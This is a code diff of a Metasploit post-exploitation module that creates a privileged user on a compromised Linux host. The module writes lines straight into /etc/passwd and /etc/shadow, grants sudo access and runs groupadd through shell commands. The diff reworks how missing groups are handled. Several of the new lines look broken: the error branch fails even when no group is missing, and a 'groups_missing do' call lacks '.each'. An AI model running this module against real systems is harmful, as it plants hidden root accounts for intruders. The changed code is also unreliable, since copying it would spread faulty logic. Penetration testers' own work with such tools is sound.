@@ -39,8 +39,7 @@ class MetasploitModule < Msf::Post
     register_advanced_options([
       OptString.new('UseraddBinary', [false, 'Set binary used to set password if you dont want module to find it for you. Set this to \'MANUAL\' to run without binary', nil]),
       OptEnum.new('SudoMethod', [false, 'Set the method that the new user can obtain root. SUDO_FILE adds the user directly to sudoers while GROUP adds the new user to the sudo group', 'GROUP', ['SUDO_FILE', 'GROUP', 'NONE']]),
-      OptBool.new('IgnoreMissingGroups', [false, 'If a group doesnt exist on the system, ignores adding it and moves on', false]),
-      OptBool.new('CreateMissingGroups', [false, 'If a group doesnt exist on the system, it\'ll create it before adding user to it', false])
+      OptEnum.new('MissingGroups', [true, 'Set how nonexisting groups are handled on the system. Either give an error in the module, ignore it and throw it out, or create the group on the system.', 'ERROR', ['ERROR', 'IGNORE', 'CREATE']]),
     ])
   end
 
@@ -67,17 +66,15 @@ class MetasploitModule < Msf::Post
 
     # Check to see that groups exist or fail
     group_file = read_file('/etc/group').to_s
-    unless datastore['CreateMissingGroups']
-      groups.each do |group|
-        unless check_group_exists?(group, group_file)
-          if datastore['IgnoreMissingGroups']
-            groups.delete(group)
-            vprint_good("Removed #{group} from target groups")
-          else
-            fail_with(Failure::NotFound, "#{group} does not exist on the system")
-          end
-        end
-      end
+    groups_missing = groups.reject { |group| check_group_exists?(group, group_file) }
+
+    if datastore['MissingGroups'] == 'ERROR'
+      fail_with(Failure::NotFound, "groups [#{groups_missing.join(' ')}] do not exist on the system")
+    end
+    vprint_bad("Groups [#{groups_missing.join(' ')}] do not exist on system")
+    if datastore['MissingGroups'] == 'IGNORE'
+      groups -= groups_missing
+      vprint_good("Removed #{groups_missing.join(' ')} from target groups")
     end
 
     # Check database to see what OS it is. If it meets specific requirements, This can all be done in a single line
@@ -121,15 +118,13 @@ class MetasploitModule < Msf::Post
 
         # Since command can add on groups, checking over groups
         groupadd = ''
-        if datastore['CreateMissingGroups']
+        if datastore['MissingGroups'] == 'CREATE'
           groupadd = command_exists?('groupadd') ? 'groupadd' : 'addgroup'
-        end
-        groups.each do |group|
-          next if check_group_exists?(group, group_file)
 
-          vprint_bad("Group #{group} does not exist on the system")
-          cmd_exec("#{groupadd} #{group}")
-          vprint_good("Added #{group} group")
+          groups_missing.each do |group|
+            cmd_exec("#{groupadd} #{group}")
+            vprint_good("Added #{group} group")
+          end
         end
         groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"
 
@@ -168,15 +163,13 @@ class MetasploitModule < Msf::Post
 
         # Since command can add on groups, checking over groups
         groupadd = ''
-        if datastore['CreateMissingGroups']
+        if datastore['MissingGroups'] == 'CREATE'
           groupadd = command_exists?('groupadd') ? 'groupadd' : 'addgroup'
-        end
-        groups.each do |group|
-          next if check_group_exists?(group, group_file)
 
-          vprint_bad("Group #{group} does not exist on the system")
-          cmd_exec("#{groupadd} #{group}")
-          vprint_good("Added #{group} group")
+          groups_missing.each do |group|
+            cmd_exec("#{groupadd} #{group}")
+            vprint_good("Added #{group} group")
+          end
         end
         groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"
 
@@ -218,13 +211,14 @@ class MetasploitModule < Msf::Post
       vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\' >> /etc/passwd"))
       vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}::0:99999:7:::\' >> /etc/shadow")) # TODO: Finalize this line
       group_file_save = group_file
-      groups.each do |group|
-        if check_group_exists?(group, group_file)
-          vprint_bad("Group #{group} does not exist on the system")
+
+      groups.select do |group|
+        group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:.+)$/, "\\1,#{datastore['USERNAME']}").gsub(/^(#{group}:[^:]*:[0-9]+:)$/, "\\1#{datastore['USERNAME']}")
+      end
+      if datastore['MissingGroups'] == 'CREATE'
+        groups_missing do |group|
           group_file += "\n#{group}:x:#{datastore['USERNAME']}\n"
           vprint_good("Added #{group} group")
-        else
-          group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:.+)$/, "\\1,#{datastore['USERNAME']}").gsub(/^(#{group}:[^:]*:[0-9]+:)$/, "\\1#{datastore['USERNAME']}")
         end
       end
       group_file = group_file.gsub(/\n{2,}/, "\n")
@@ -237,15 +231,13 @@ class MetasploitModule < Msf::Post
     unless groups_handled
       # Since command can add on groups, checking over groups
       groupadd = ''
-      if datastore['CreateMissingGroups']
+      if datastore['MissingGroups'] == 'CREATE'
         groupadd = command_exists?('groupadd') ? 'groupadd' : 'addgroup'
-      end
-      groups.each do |group|
-        next if check_group_exists?(group, group_file)
 
-        vprint_bad("Group #{group} does not exist on the system")
-        cmd_exec("#{groupadd} #{group}")
-        vprint_good("Added #{group} group")
+        groups_missing.each do |group|
+          cmd_exec("#{groupadd} #{group}")
+          vprint_good("Added #{group} group")
+        end
       end
 
       # Attempt to do add groups to user by normal means, or do it manually
